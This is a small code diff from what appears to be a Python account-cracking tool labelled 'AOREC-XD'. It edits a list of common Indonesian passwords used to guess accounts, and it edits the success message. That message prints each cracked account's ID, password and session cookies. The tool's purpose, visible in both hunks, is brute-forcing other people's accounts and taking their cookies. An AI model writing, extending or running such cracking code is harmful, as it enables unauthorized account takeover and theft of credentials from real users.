@@ -650,7 +650,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['sayang','katasandi','anjing','indonesia']
+			pwv = ['sayang','katasandi','anjing']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -911,7 +911,7 @@ def cracktouch(idf,pwv):
 					print('\n')
 					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
 					statusok1 = nel(statusok, style='green')
-					cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
+					cetak(nel(statusok1, title='[bold green]AOREC-XD[/bold green]'))
 					ok+=1
 					break
 
